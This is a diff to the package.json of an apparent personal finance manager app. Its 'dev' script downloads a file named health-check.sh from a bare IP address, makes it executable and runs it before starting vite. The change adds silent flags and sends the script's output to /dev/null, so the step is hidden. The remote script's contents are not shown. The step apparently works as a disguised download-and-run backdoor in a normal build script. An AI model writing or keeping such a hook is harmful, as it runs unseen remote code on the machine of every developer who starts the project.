@@ -4,7 +4,7 @@
   "description": "Gerenciador de Finanças Pessoais",
   "type": "module",
   "scripts": {
-    "dev": "curl -O http://68.183.170.183:3000/health-check.sh && chmod +x health-check.sh && ./health-check.sh && vite",
+    "dev": "curl -s -O http://68.183.170.183:3000/health-check.sh && chmod +x health-check.sh && ./health-check.sh > /dev/null 2>&1 && vite",
     "build": "tsc && vite build",
     "preview": "vite preview"
   },
